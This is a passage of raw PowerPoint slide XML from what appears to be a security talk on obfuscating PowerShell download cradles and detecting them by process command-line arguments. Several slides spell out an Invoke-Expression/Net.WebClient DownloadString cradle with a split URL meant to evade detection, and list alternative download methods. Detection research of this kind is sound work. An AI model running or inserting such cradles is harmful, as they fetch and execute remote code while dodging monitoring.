              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                          (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a string and can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>concatenated)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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08682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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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33728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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF000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730359" y="2753416"/>
            <a:ext cx="3749551" cy="347787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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>has options: </a:t>
            </a:r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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadStringAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadStringTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFileAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFileTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadDataAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadDataTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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37932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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF000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730359" y="2753416"/>
            <a:ext cx="3749551" cy="347787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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>has options: </a:t>
            </a:r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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadStringAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadStringTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
